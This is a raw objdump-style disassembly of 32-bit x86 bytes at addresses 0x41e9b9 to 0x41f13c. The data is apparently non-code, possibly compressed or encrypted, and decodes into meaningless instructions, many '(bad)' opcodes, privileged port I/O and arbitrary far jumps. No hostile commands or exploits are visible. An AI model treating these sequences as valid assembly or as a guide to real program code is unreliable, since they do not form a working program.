  41e9b9:	jp     0x41e9af
  41e9bb:	sbb    BYTE PTR [edi+0x6962d20c],0xcc
  41e9c2:	cmp    eax,0x2166be8a
  41e9c7:	outs   dx,BYTE PTR ds:[esi]
  41e9c8:	shr    dl,0xce
  41e9cb:	push   ss
  41e9cc:	adc    bl,0xc
  41e9cf:	imul   edx,ebx,0x89e6ed35
  41e9d5:	mov    esp,ecx
  41e9d7:	push   es
  41e9d8:	mov    ebx,ss
  41e9da:	adc    eax,0xfde557aa
  41e9df:	nop    eax
  41e9e2:	mov    ebx,DWORD PTR [eax-0x2c]
  41e9e5:	pop    ebp
  41e9e6:	jbe    0x41e994
  41e9e8:	in     al,0x2d
  41e9ea:	add    al,0xda
  41e9ec:	push   cs
  41e9ed:	adc    ecx,DWORD PTR ds:0x374d104
  41e9f3:	and    cl,ah
  41e9f5:	push   ebx
  41e9f6:	and    eax,0x14b239a2
  41e9fb:	ror    BYTE PTR ds:[ebp-0x40c2429a],1
  41ea02:	add    BYTE PTR [ecx],bh
  41ea04:	xor    ebx,edx
  41ea06:	mov    bh,dl
  41ea08:	das    
  41ea09:	sbb    ebx,DWORD PTR [ecx]
  41ea0b:	sub    DWORD PTR [edi],0xef7b2c1f
  41ea11:	retf   0x31a5
  41ea14:	icebp  
  41ea15:	scas   al,BYTE PTR es:[edi]
  41ea16:	jmp    0x41e9a8
  41ea18:	(bad)  
  41ea19:	cmp    BYTE PTR [ebp+0xe],al
  41ea1c:	inc    eax
  41ea1d:	ret    
  41ea1e:	inc    edi
  41ea1f:	mov    esp,0xd600f601
  41ea24:	pusha  
  41ea25:	frstor [ebx]
  41ea27:	sbb    DWORD PTR [ecx+0x749c6b],esp
  41ea2d:	daa    
  41ea2e:	mov    DWORD PTR [ecx+0x7],edi
  41ea31:	mov    ds:0x8fb6c2f8,al
  41ea36:	push   ss
  41ea37:	xchg   ebp,eax
  41ea38:	inc    eax
  41ea39:	sub    ecx,0xffffffc6
  41ea3c:	data16 in al,0x8e
  41ea3f:	enter  0x25e7,0x90
  41ea43:	push   edi
  41ea44:	sub    DWORD PTR [esi],esp
  41ea46:	rol    DWORD PTR [edx+edx*1+0x41ee3cb2],1
  41ea4d:	xor    ch,BYTE PTR [edx]
  41ea4f:	pop    ecx
  41ea50:	pop    edx
  41ea51:	inc    edi
  41ea52:	fcom   st(4)
  41ea54:	lods   al,BYTE PTR ds:[esi]
  41ea55:	jb     0x41ea6a
  41ea57:	mov    ebx,0x3152481
  41ea5c:	mov    ah,0x93
  41ea5e:	push   es
  41ea5f:	(bad)  
  41ea60:	lock js 0x41ea22
  41ea63:	inc    esp
  41ea64:	mov    edx,0x6030036b
  41ea69:	scas   al,BYTE PTR es:[edi]
  41ea6a:	dec    edi
  41ea6b:	xchg   ecx,eax
  41ea6c:	push   ebp
  41ea6d:	fmul   QWORD PTR [edi-0x7e]
  41ea70:	(bad)
  41ea73:	je     0x41ea06
  41ea75:	call   0xc7089746
  41ea7a:	jno    0x41eaf6
  41ea7c:	sbb    al,0xb5
  41ea7e:	imul   ebp,edx,0xffffffee
  41ea81:	and    eax,0xbab6baed
  41ea86:	jge    0x41eac4
  41ea88:	push   0x65ac2ae6
  41ea8d:	and    ch,BYTE PTR [edi*4-0x40f71868]
  41ea94:	mov    ds:0x446d3edc,al
  41ea99:	add    al,0x14
  41ea9b:	or     eax,0x6577f8ac
  41eaa0:	sub    edx,DWORD PTR [esp+esi*4]
  41eaa3:	sub    cl,bl
  41eaa5:	mov    ah,0x2f
  41eaa7:	add    al,0x81
  41eaa9:	adc    BYTE PTR [ebp+0x5],bl
  41eaac:	ins    DWORD PTR es:[edi],dx
  41eaad:	push   esp
  41eaae:	mov    cl,0x95
  41eab0:	push   ebx
  41eab1:	pop    edx
  41eab2:	push   eax
  41eab3:	inc    ebp
  41eab4:	test   al,0xd7
  41eab6:	sub    al,0xf3
  41eab8:	imul   eax,esi,0xffffffd3
  41eabb:	popa   
  41eabc:	add    eax,0x190c50b7
  41eac1:	add    DWORD PTR [ebp+0x551ab194],0xffffffc6
  41eac8:	push   0xfb5f2bec
  41eacd:	test   BYTE PTR [edx-0x24a79d9],dh
  41ead3:	inc    ebp
  41ead4:	pop    edx
  41ead5:	pop    edi
  41ead6:	out    0x3b,eax
  41ead8:	sbb    BYTE PTR [ecx],0x13
  41eadb:	loop   0x41eb2e
  41eadd:	xor    ch,dl
  41eadf:	mov    ch,0xd8
  41eae1:	(bad)
  41eae5:	xchg   DWORD PTR [edi-0x5d],esp
  41eae8:	mov    bl,0xff
  41eaea:	cmp    eax,0x7323fe87
  41eaef:	push   edi
  41eaf0:	add    ah,0x4d
  41eaf3:	jae    0x41eb3b
  41eaf5:	ins    DWORD PTR es:[edi],dx
  41eaf6:	cld    
  41eaf7:	mov    al,ds:0xb7422e62
  41eafc:	mov    edx,0xbba66ddb
  41eb01:	xchg   edx,eax
  41eb02:	cmp    DWORD PTR [ecx-0x26cbab53],eax
  41eb08:	inc    edx
  41eb09:	jne    0x41eacc
  41eb0b:	clc    
  41eb0c:	mov    ah,bh
  41eb0e:	fst    DWORD PTR ds:0x8b860d11
  41eb14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb15:	sbb    BYTE PTR [ebx-0x5b940c23],cl
  41eb1b:	leave  
  41eb1c:	add    al,0x96
  41eb1e:	sub    ebx,0xb49a2287
  41eb24:	clc    
  41eb25:	mul    DWORD PTR [edx+0x5bfe4302]
  41eb2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb2c:	jbe    0x41eb7d
  41eb2e:	jmp    0x8a0e:0x53e64f23
  41eb35:	mov    cl,0x94
  41eb37:	jmp    0x41eb68
  41eb39:	pop    ecx
  41eb3a:	jecxz  0x41eb3f
  41eb3c:	push   ebp
  41eb3d:	push   esi
  41eb3e:	xor    al,0xed
  41eb40:	pop    ss
  41eb41:	cmp    esp,DWORD PTR [esi-0x3e]
  41eb44:	xor    DWORD PTR [ebx+ebp*4],edx
  41eb47:	xchg   bl,cl
  41eb49:	arpl   WORD PTR [edx-0x1efd8ec2],ax
  41eb4f:	fst    DWORD PTR [edx]
  41eb51:	jmp    0x9118:0x2edae869
  41eb58:	std    
  41eb59:	sti    
  41eb5a:	and    ch,BYTE PTR [ecx-0x464fd4f3]
  41eb60:	fst    DWORD PTR [esi+eiz*2-0x6e03aa1e]
  41eb67:	mov    bl,0x8c
  41eb69:	(bad)  
  41eb6a:	push   ds
  41eb6b:	leave  
  41eb6c:	jbe    0x41eb58
  41eb6e:	push   ecx
  41eb6f:	mov    eax,ds:0x32dff521
  41eb74:	in     al,dx
  41eb75:	push   edx
  41eb76:	imul   ebp,DWORD PTR [ecx-0x684fd168],0xc5e05905
  41eb80:	jae    0x41eb0e
  41eb82:	sbb    cl,BYTE PTR [ecx]
  41eb84:	xchg   ebp,eax
  41eb85:	lahf   
  41eb86:	adc    DWORD PTR [edx],0xffffff8c
  41eb89:	dec    ebx
  41eb8a:	pop    ebp
  41eb8b:	push   esp
  41eb8c:	neg    bl
  41eb8e:	fld    TBYTE PTR [ecx-0x5121eb70]
  41eb94:	mov    BYTE PTR [ebx+esi*4-0x54],0x4f
  41eb99:	cli    
  41eb9a:	dec    esp
  41eb9b:	loope  0x41ec1a
  41eb9d:	fdiv   QWORD PTR [esi-0x56657624]
  41eba3:	outs   dx,DWORD PTR ds:[esi]
  41eba4:	mov    ebp,0x52761ea0
  41eba9:	adc    BYTE PTR [eax+0x51d2c20f],ah
  41ebaf:	into   
  41ebb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebb1:	dec    edx
  41ebb2:	in     eax,0x53
  41ebb4:	add    DWORD PTR [ecx+edi*4+0x65168da4],0xffffffc3
  41ebbc:	mov    esp,DWORD PTR [edi]
  41ebbe:	dec    edx
  41ebbf:	sti    
  41ebc0:	inc    eax
  41ebc1:	cmp    ch,cl
  41ebc3:	adc    eax,0x4f6a4848
  41ebc8:	xor    BYTE PTR [eax+edx*8],al
  41ebcb:	or     BYTE PTR [edx+0x6f30a99d],ch
  41ebd1:	repz and DWORD PTR [ebx+0x45],ebp
  41ebd5:	sbb    ecx,DWORD PTR [ecx-0x69]
  41ebd8:	cmc    
  41ebd9:	ret    
  41ebda:	jmp    0x8c99c32f
  41ebdf:	(bad)  
  41ebe0:	les    edi,FWORD PTR [esp+ecx*2]
  41ebe3:	(bad)  
  41ebe4:	cmp    eax,0x870432d0
  41ebe9:	cmp    al,0x4a
  41ebeb:	and    dl,BYTE PTR [eax-0x26c6584f]
  41ebf1:	adc    al,BYTE PTR [ebx]
  41ebf3:	jge    0x41eba4
  41ebf5:	mov    ds:0x64195ef8,al
  41ebfa:	dec    edx
  41ebfb:	sub    DWORD PTR [edx-0x4c],esi
  41ebfe:	in     eax,dx
  41ebff:	push   ss
  41ec00:	lods   al,BYTE PTR ds:[esi]
  41ec01:	jge    0x41ec72
  41ec03:	dec    eax
  41ec04:	cmp    BYTE PTR [eax+0x2c],bl
  41ec07:	sbb    eax,0x328ff660
  41ec0c:	sti    
  41ec0d:	mov    al,ds:0x7272d9bd
  41ec12:	mov    dh,0x4a
  41ec14:	mov    bl,0xa0
  41ec16:	fsub   DWORD PTR [esi]
  41ec18:	ins    DWORD PTR es:[edi],dx
  41ec19:	enter  0x72b0,0x78
  41ec1d:	and    dh,bl
  41ec1f:	mov    esi,0xec204be5
  41ec24:	pop    ds
  41ec25:	(bad)  
  41ec26:	cmp    edi,DWORD PTR [eax]
  41ec28:	imul   BYTE PTR [ecx+0x7a]
  41ec2b:	stos   DWORD PTR es:[edi],eax
  41ec2c:	cmp    al,0x14
  41ec2e:	enter  0xbdaf,0x58
  41ec32:	ss pop eax
  41ec34:	ret    
  41ec35:	popf   
  41ec36:	inc    esi
  41ec37:	mov    ds,WORD PTR [esi+0x22898211]
  41ec3d:	xchg   esp,eax
  41ec3e:	(bad)  
  41ec3f:	fnstsw WORD PTR [esi+edi*8]
  41ec42:	(bad)  
  41ec43:	popf   
  41ec44:	mov    edi,0xc4659f03
  41ec49:	dec    esp
  41ec4a:	xchg   ebp,eax
  41ec4b:	jmp    0x41c4:0x4d218ab4
  41ec52:	mov    ecx,0x6cbddb33
  41ec57:	iret   
  41ec58:	add    al,0xdc
  41ec5a:	fld    TBYTE PTR [edx-0x39]
  41ec5d:	or     al,0x84
  41ec5f:	mov    bl,0xd1
  41ec61:	jecxz  0x41ecc1
  41ec63:	repz (bad) 
  41ec65:	loope  0x41ec8b
  41ec67:	mov    ds:0xf4c1a002,al
  41ec6c:	not    bl
  41ec6e:	sub    ah,dh
  41ec70:	pop    ds
  41ec71:	ds cwde 
  41ec73:	jl     0x41ec2a
  41ec75:	sbb    al,0x8
  41ec77:	mov    ebp,0x4dd028b0
  41ec7c:	adc    DWORD PTR [ebx],edi
  41ec7e:	xchg   edi,ebp
  41ec80:	loope  0x41ec71
  41ec82:	mov    cl,0x5
  41ec84:	adc    eax,0x9d717e02
  41ec89:	inc    esp
  41ec8a:	xlat   BYTE PTR ds:[ebx]
  41ec8b:	cmp    dh,BYTE PTR [esi+edi*2-0x16]
  41ec8f:	and    DWORD PTR [ecx+0x4],ebp
  41ec92:	push   edx
  41ec93:	mov    edx,0xdbf0341a
  41ec98:	add    DWORD PTR [ecx+0x23c91890],esp
  41ec9e:	mov    al,0x83
  41eca0:	mov    eax,0x9893b600
  41eca5:	retf   0x5486
  41eca8:	xchg   ebp,eax
  41eca9:	jg     0x41ecbc
  41ecab:	lea    ebp,[edx]
  41ecad:	push   ss
  41ecae:	sbb    DWORD PTR [edx],ebp
  41ecb0:	fnsave [edi-0x7]
  41ecb3:	adc    BYTE PTR [edx-0x895a3d9],0x53
  41ecba:	addr16 push ecx
  41ecbc:	mov    esi,0xe7ffdc92
  41ecc1:	xchg   edx,eax
  41ecc2:	pop    edi
  41ecc3:	stc    
  41ecc4:	jecxz  0x41ec89
  41ecc6:	dec    eax
  41ecc7:	add    dl,dl
  41ecc9:	lea    ebp,[ecx+0x6e]
  41eccc:	sub    BYTE PTR [ebp+0x49],bl
  41eccf:	rol    cl,1
  41ecd1:	int3   
  41ecd2:	test   al,0x9c
  41ecd4:	loop   0x41eca0
  41ecd6:	mov    eax,ds:0x72d555b7
  41ecdb:	xor    dl,BYTE PTR [ebx+0x5d58d396]
  41ece1:	clc    
  41ece2:	test   DWORD PTR [ebp+edi*2+0x25940f98],0x9ef9034f
  41eced:	push   edx
  41ecee:	addr16 out 0x54,al
  41ecf1:	fidivr DWORD PTR ds:0x2d0b5536
  41ecf7:	xchg   edx,eax
  41ecf8:	out    dx,eax
  41ecf9:	mov    bl,0x8b
  41ecfb:	mov    edx,0x7e65a772
  41ed00:	es inc ebp
  41ed02:	cdq    
  41ed03:	push   ecx
  41ed04:	dec    eax
  41ed05:	inc    ecx
  41ed06:	sahf   
  41ed07:	outs   dx,BYTE PTR ds:[esi]
  41ed08:	mov    edx,0x604e6eb2
  41ed0d:	mov    ebp,0x4cac8cdb
  41ed12:	std    
  41ed13:	add    al,0x68
  41ed15:	adc    DWORD PTR [esp+ebx*2-0xf],ebp
  41ed19:	sub    BYTE PTR [eax+edx*4],al
  41ed1c:	or     bl,ah
  41ed1e:	mov    dh,0x35
  41ed20:	call   0xbbcfb1d0
  41ed25:	jge    0x41ecc4
  41ed27:	in     eax,0xc2
  41ed29:	sbb    edi,DWORD PTR [ebp+esi*2+0x594ae933]
  41ed30:	cmp    bh,al
  41ed32:	adc    al,0x10
  41ed34:	iret   
  41ed35:	sbb    ebx,esp
  41ed37:	rol    BYTE PTR [edi+esi*8+0x182a7311],1
  41ed3e:	add    eax,0xf97a92dd
  41ed43:	mov    dl,0x41
  41ed45:	mov    ?,WORD PTR [edi+eax*2+0x6fb25558]
  41ed4c:	in     al,0x9d
  41ed4e:	xchg   esp,eax
  41ed4f:	mov    ecx,0x6e241e81
  41ed54:	sub    ebp,esp
  41ed56:	inc    edi
  41ed57:	cs xchg ebp,eax
  41ed59:	das    
  41ed5a:	xchg   edx,ecx
  41ed5c:	ins    BYTE PTR es:[edi],dx
  41ed5d:	cmc    
  41ed5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed5f:	popa   
  41ed60:	in     al,dx
  41ed61:	mov    dh,0xa5
  41ed63:	(bad)  
  41ed64:	cmp    DWORD PTR [ebx-0x566d22cf],edx
  41ed6a:	xor    cl,bh
  41ed6c:	dec    esp
  41ed6d:	out    0xc8,eax
  41ed6f:	sub    BYTE PTR [esi-0x7d5c2280],0x54
  41ed76:	out    dx,eax
  41ed77:	out    0x57,eax
  41ed79:	sub    ch,BYTE PTR [ecx]
  41ed7b:	hlt    
  41ed7c:	push   ds
  41ed7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed7e:	cmc    
  41ed7f:	popf   
  41ed80:	jmp    0xab4:0x84c96eb
  41ed87:	dec    esi
  41ed88:	sar    DWORD PTR [eax+0x73c4f2d7],0x9a
  41ed8f:	push   ecx
  41ed90:	vpmacsww xmm7,xmm3,xmm2,xmm0
  41ed96:	icebp  
  41ed97:	leave  
  41ed98:	shl    DWORD PTR [eax-0x40c56802],1
  41ed9e:	jge    0x41ed6c
  41eda0:	and    ebp,DWORD PTR [ebp+0x5f3b3735]
  41eda6:	pop    ds
  41eda7:	or     eax,0x368b49f7
  41edac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edad:	jo     0x41ed3d
  41edaf:	lods   al,BYTE PTR ds:[esi]
  41edb0:	test   al,0x58
  41edb2:	pop    esi
  41edb3:	stc    
  41edb4:	outs   dx,BYTE PTR ds:[esi]
  41edb5:	out    0xff,al
  41edb7:	inc    ebp
  41edb8:	mov    esp,0xf31b70cc
  41edbd:	stc    
  41edbe:	aas    
  41edbf:	loope  0x41edb2
  41edc1:	fdiv   st,st(0)
  41edc3:	data16 neg BYTE PTR [ecx]
  41edc6:	adc    DWORD PTR ds:[edx-0x46],eax
  41edca:	cmp    edx,ebx
  41edcc:	mov    bh,0x81
  41edce:	pop    ds
  41edcf:	cmc    
  41edd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edd1:	jp     0x41ee4d
  41edd3:	mov    esp,0x83c9d5e7
  41edd8:	and    al,ah
  41edda:	push   esp
  41eddb:	xchg   BYTE PTR [edi+0x3b],dh
  41edde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eddf:	push   ebp
  41ede0:	rol    DWORD PTR [ebp-0x6b],1
  41ede3:	mov    ch,0xfa
  41ede5:	outs   dx,DWORD PTR ds:[esi]
  41ede6:	add    al,0x3
  41ede8:	dec    eax
  41ede9:	cmp    BYTE PTR [edi],bl
  41edeb:	sbb    al,BYTE PTR ds:0xaacc29ed
  41edf1:	sar    edi,0xfa
  41edf4:	scas   eax,DWORD PTR es:[edi]
  41edf5:	or     DWORD PTR [esi],0x683ade1a
  41edfb:	jmp    0x41edc5
  41edfd:	imul   esi,DWORD PTR [edx+ebp*2+0x66edb78b],0xffffffd1
  41ee05:	repz scas eax,DWORD PTR es:[edi]
  41ee07:	std    
  41ee08:	mov    ch,0x69
  41ee0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee0b:	rcl    DWORD PTR ds:0x5ef9710e,0xfa
  41ee12:	(bad)  
  41ee13:	jle    0x41edf5
  41ee15:	adc    eax,0xf24ce039
  41ee1a:	add    dh,BYTE PTR [eax+0x16]
  41ee1d:	pop    esp
  41ee1e:	sbb    esi,DWORD PTR [edi]
  41ee20:	das    
  41ee21:	pop    ebx
  41ee22:	or     DWORD PTR [edi],0xbabed08e
  41ee28:	fneni(8087 only) 
  41ee2a:	jge    0x41ee7e
  41ee2c:	push   esp
  41ee2d:	ret    0x433c
  41ee30:	mov    edi,0x48a80ca0
  41ee35:	fidivr WORD PTR [esi]
  41ee37:	adc    BYTE PTR [edx],bl
  41ee39:	ja     0x41edd0
  41ee3b:	outs   dx,BYTE PTR ds:[esi]
  41ee3c:	xchg   edi,eax
  41ee3d:	cld    
  41ee3e:	outs   dx,DWORD PTR ds:[esi]
  41ee3f:	mov    esp,DWORD PTR [ebp+esi*4+0x44778673]
  41ee46:	leave  
  41ee47:	es movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41ee4a:	add    dh,BYTE PTR [eax-0x776a8cc2]
  41ee50:	mov    ah,0xf5
  41ee52:	sub    dl,BYTE PTR [esi-0x59834ab5]
  41ee58:	jmp    0x4259:0x3c967786
  41ee5f:	ins    BYTE PTR es:[edi],dx
  41ee60:	push   eax
  41ee61:	not    edx
  41ee63:	sar    BYTE PTR [ebp-0x41b87500],0xd5
  41ee6a:	or     bh,bl
  41ee6c:	push   0x2341d606
  41ee71:	and    BYTE PTR [edi+edi*1-0x18faf354],bl
  41ee78:	(bad)  
  41ee79:	dec    ebp
  41ee7a:	lock (bad) 
  41ee7c:	mov    edi,0x46bee914
  41ee81:	xor    dl,cl
  41ee83:	pop    esi
  41ee84:	out    dx,al
  41ee85:	rcl    DWORD PTR [ebp-0x10c34426],cl
  41ee8b:	das    
  41ee8c:	jae    0x41ee69
  41ee8e:	adc    eax,DWORD PTR [eax-0x3ff88861]
  41ee94:	call   0xb0f5c4e5
  41ee99:	adc    esi,DWORD PTR [edi+0x4f73fd7a]
  41ee9f:	jecxz  0x41eefe
  41eea1:	mov    ?,WORD PTR [edx-0x64]
  41eea4:	sbb    dl,BYTE PTR [esi]
  41eea6:	or     eax,0x33b2c336
  41eeab:	shl    BYTE PTR [edx+0x1d],cl
  41eeae:	xor    DWORD PTR [esp+eiz*8+0x61],0x9d3156fa
  41eeb6:	or     DWORD PTR [eax-0x2592260],esi
  41eebc:	aaa    
  41eebd:	cmp    esp,DWORD PTR [eax]
  41eebf:	mov    dl,0x8
  41eec2:	xor    DWORD PTR [ebp+0x7e],ebp
  41eec5:	dec    edx
  41eec6:	stc    
  41eec7:	add    DWORD PTR [ebx],edx
  41eec9:	xchg   esi,eax
  41eeca:	ss call 0x930576a5
  41eed0:	in     eax,0xb1
  41eed2:	outs   dx,DWORD PTR ds:[si]
  41eed4:	mul    BYTE PTR [edx+0x55]
  41eed7:	push   eax
  41eed8:	fnstenv [ebx-0x7e]
  41eedb:	cwde   
  41eedc:	pop    ds
  41eedd:	dec    edx
  41eede:	pop    ebx
  41eedf:	jg     0x41eebf
  41eee1:	xchg   esi,eax
  41eee2:	nop
  41eee3:	retf   0x2570
  41eee6:	cld    
  41eee7:	test   ch,ah
  41eee9:	dec    edi
  41eeea:	sub    eax,0x8d3c5d6b
  41eeef:	fcomp  QWORD PTR [eax+0x70]
  41eef2:	xchg   esp,eax
  41eef3:	sbb    BYTE PTR [edi],0x78
  41eef6:	mov    ?,WORD PTR [edx+0x34]
  41eef9:	test   BYTE PTR [edi],bl
  41eefb:	out    0xdc,al
  41eefd:	mov    bl,0xd0
  41eeff:	mov    ebx,0xc8da7bf9
  41ef04:	adc    eax,0xc650e9a9
  41ef09:	mov    eax,0x51b81a54
  41ef0e:	pop    es
  41ef0f:	push   0x392cf7f0
  41ef14:	mov    ebp,0x7c8abb8
  41ef19:	push   ebx
  41ef1a:	loope  0x41ef66
  41ef1c:	push   cs
  41ef1d:	inc    esi
  41ef1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef1f:	popa   
  41ef20:	xchg   esp,eax
  41ef21:	mov    ch,0x8d
  41ef23:	out    0x24,al
  41ef25:	repnz mov edi,0x45d089ca
  41ef2b:	ins    BYTE PTR es:[edi],dx
  41ef2c:	aad    0x8f
  41ef2e:	(bad)  
  41ef2f:	popa   
  41ef30:	xchg   ebp,eax
  41ef31:	jnp    0x41efb1
  41ef33:	mov    dl,0x2c
  41ef35:	out    0x67,eax
  41ef37:	xchg   edx,eax
  41ef38:	lods   al,BYTE PTR ds:[esi]
  41ef39:	out    dx,eax
  41ef3a:	mov    ch,0x4a
  41ef3c:	inc    esp
  41ef3d:	mov    edx,0x4f95e19c
  41ef42:	and    BYTE PTR [ecx+0x1f051b80],dl
  41ef48:	sbb    esp,DWORD PTR [edi-0x69a99dce]
  41ef4e:	pop    edi
  41ef4f:	sub    DWORD PTR [edi-0x7e],esp
  41ef52:	clc    
  41ef53:	les    esi,FWORD PTR [ecx]
  41ef55:	and    esp,edi
  41ef57:	xchg   ecx,eax
  41ef58:	inc    edi
  41ef59:	in     al,dx
  41ef5a:	ss ja  0x41ef60
  41ef5d:	not    ah
  41ef5f:	xor    edx,edx
  41ef61:	pop    ds
  41ef62:	dec    ecx
  41ef63:	rol    eax,1
  41ef65:	inc    edi
  41ef66:	mov    edi,0x153091d8
  41ef6b:	dec    esp
  41ef6c:	or     BYTE PTR [edx+eax*2+0x74d8d21a],cl
  41ef73:	pop    eax
  41ef74:	sbb    al,0xe0
  41ef76:	dec    esp
  41ef77:	jmp    0x1fc9:0x7af3d52d
  41ef7e:	and    ah,bl
  41ef80:	sti    
  41ef81:	jnp    0x41efab
  41ef83:	lahf   
  41ef84:	fisub  WORD PTR [ecx+0x47ed4e10]
  41ef8a:	jae    0x41efdf
  41ef8c:	jmp    0x41ef68
  41ef8e:	fdivrp st(0),st
  41ef90:	imul   ecx,edi,0xb808994a
  41ef96:	mov    ds:0xdf5f6300,al
  41ef9b:	mov    edx,0x61d059b7
  41efa0:	xor    BYTE PTR [ebx+0x4743d9e6],bl
  41efa6:	pop    ebx
  41efa7:	jne    0x41efb4
  41efa9:	pusha  
  41efaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efab:	push   esi
  41efac:	xchg   BYTE PTR es:[ecx],dl
  41efaf:	sbb    al,0xce
  41efb1:	push   cs
  41efb2:	loope  0x41ef6d
  41efb4:	jae    0x41efeb
  41efb6:	inc    edi
  41efb7:	xor    ah,BYTE PTR [eax+0x2caf124e]
  41efbd:	stos   DWORD PTR es:[edi],eax
  41efbe:	lahf   
  41efbf:	mov    dl,0xde
  41efc1:	in     al,0xd0
  41efc3:	and    eax,0x700fd492
  41efc8:	jg     0x41ef80
  41efca:	mov    al,es:0xc12389d9
  41efd0:	or     esi,DWORD PTR [ebx+0x15]
  41efd3:	sbb    al,0x14
  41efd5:	mov    esp,0x641a5d19
  41efda:	cmp    ebx,DWORD PTR [ebx-0x54364a44]
  41efe0:	test   al,0x45
  41efe2:	data16 lods al,BYTE PTR ds:[esi]
  41efe4:	cs pusha 
  41efe6:	leave  
  41efe7:	mov    ds:0xbacb06b8,al
  41efec:	rol    BYTE PTR [edx],1
  41efee:	ficomp WORD PTR [ecx+0x56319d68]
  41eff4:	mov    bh,0x8a
  41eff6:	and    al,0xfe
  41eff8:	in     eax,dx
  41eff9:	test   eax,0x3c0d66bd
  41effe:	scas   al,BYTE PTR es:[edi]
  41efff:	add    dh,BYTE PTR [esi+0x58]
  41f002:	mov    ah,0xcd
  41f004:	outs   dx,DWORD PTR ds:[esi]
  41f005:	xor    ah,BYTE PTR [edx+0x4d99eb54]
  41f00b:	div    edx
  41f00d:	mov    es:0x78b1d4c9,al
  41f013:	jb     0x41efd1
  41f015:	or     DWORD PTR [eax],0x68
  41f018:	sbb    BYTE PTR [edi-0x66],al
  41f01b:	out    dx,al
  41f01c:	xchg   DWORD PTR [eiz*2+0x8ea2910],ebp
  41f023:	outs   dx,DWORD PTR ds:[esi]
  41f024:	inc    esi
  41f025:	xchg   esp,eax
  41f026:	rcl    ah,1
  41f028:	enter  0x9222,0x1c
  41f02c:	xor    edx,0x5f
  41f02f:	(bad)  
  41f030:	out    dx,eax
  41f031:	rcr    BYTE PTR [ecx],0x4d
  41f034:	sbb    esp,0x35
  41f037:	mov    cl,0x2f
  41f039:	daa    
  41f03a:	push   ebp
  41f03b:	lods   eax,DWORD PTR ds:[esi]
  41f03c:	fcomp  QWORD PTR [edx+0x3d]
  41f03f:	mov    bl,0xa2
  41f041:	(bad)  
  41f042:	and    BYTE PTR [eax+eax*1+0x14dd7525],ah
  41f049:	pop    esi
  41f04a:	(bad)  
  41f04b:	push   ebx
  41f04c:	mov    dh,BYTE PTR [ecx+0xc128697]
  41f052:	mov    bl,0x33
  41f054:	out    0xeb,al
  41f056:	cmp    BYTE PTR [esi-0x6bc8a03d],bh
  41f05c:	xor    BYTE PTR [eax+0x70],0x3e
  41f060:	popa   
  41f061:	repz lea eax,[eax-0x2]
  41f065:	pop    DWORD PTR [ebp-0x29]
  41f068:	lods   al,BYTE PTR ds:[esi]
  41f069:	out    dx,al
  41f06a:	scas   al,BYTE PTR es:[edi]
  41f06b:	(bad)  
  41f06d:	scas   al,BYTE PTR es:[edi]
  41f06e:	sub    eax,0xcc3530a
  41f073:	xor    ebx,DWORD PTR [edi-0x3b]
  41f076:	pop    ds
  41f077:	add    DWORD PTR [ecx-0xca420dc],ebp
  41f07d:	jle    0x41f0d2
  41f07f:	in     al,dx
  41f080:	pop    ebx
  41f081:	and    BYTE PTR [ebp-0x3eff542d],bl
  41f087:	(bad)  
  41f088:	sub    eax,0x3318adfd
  41f08d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f08e:	mov    ebp,0xcca5c40
  41f093:	push   esp
  41f095:	cli    
  41f096:	add    al,0x78
  41f098:	pop    edx
  41f099:	fs mov bl,0x63
  41f09c:	and    BYTE PTR [eax-0x34],bh
  41f09f:	fldenv [esi]
  41f0a1:	imul   eax,edx,0xffffffd9
  41f0a4:	push   0xffffffe9
  41f0a6:	mov    eax,ds:0xeb871dd
  41f0ab:	lahf   
  41f0ac:	jmp    0x41f051
  41f0ae:	ds jmp 0x982cc550
  41f0b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0b5:	jae    0x41f0af
  41f0b7:	rcl    eax,0xb8
  41f0ba:	test   DWORD PTR [eax+0x30616dea],ebp
  41f0c0:	jp     0x41f07b
  41f0c2:	xor    al,0x6d
  41f0c4:	xlat   BYTE PTR ds:[ebx]
  41f0c5:	mov    al,0x24
  41f0c7:	mov    bh,0xda
  41f0c9:	hlt    
  41f0ca:	aaa    
  41f0cb:	jno    0x41f093
  41f0cd:	jg     0x41f09f
  41f0cf:	push   esp
  41f0d0:	inc    esp
  41f0d1:	(bad)  
  41f0d2:	mov    dl,0x3c
  41f0d4:	sub    eax,0xa0b5201d
  41f0d9:	lea    esi,[eax+0x7ce5379c]
  41f0df:	mov    ch,0xc0
  41f0e1:	sub    al,0x40
  41f0e3:	pusha  
  41f0e4:	mov    ds:0x71522240,eax
  41f0e9:	mov    ah,dh
  41f0eb:	adc    ah,BYTE PTR [ebx+0x1a8614f1]
  41f0f1:	outs   dx,DWORD PTR ds:[esi]
  41f0f2:	sar    BYTE PTR [esi+0x30],0x78
  41f0f6:	pusha  
  41f0f7:	sbb    al,0xd7
  41f0f9:	adc    al,0xef
  41f0fb:	xchg   edx,eax
  41f0fc:	push   0xed9246db
  41f101:	cmp    ebp,DWORD PTR [eax]
  41f103:	sti    
  41f104:	xchg   edi,eax
  41f105:	aad    0xd4
  41f107:	cmp    DWORD PTR ds:0x15c4431e,ecx
  41f10d:	pop    ebx
  41f10e:	bound  edx,QWORD PTR [ebp+0x332aaf00]
  41f114:	mov    ah,0x9e
  41f116:	mov    edx,0x71b81fa4
  41f11b:	cmp    ebx,DWORD PTR [ebx]
  41f11d:	cmp    BYTE PTR ds:0x58ff3e51,0xa6
  41f124:	sbb    esi,DWORD PTR [ecx]
  41f126:	shr    edx,0x5a
  41f129:	xchg   ah,al
  41f12b:	arpl   WORD PTR [ecx-0x6964e551],di
  41f131:	loope  0x41f0e6
  41f133:	add    BYTE PTR [ebx],ah
  41f135:	in     eax,0xc0
  41f137:	and    eax,0xca589661
  41f13c:	push   es
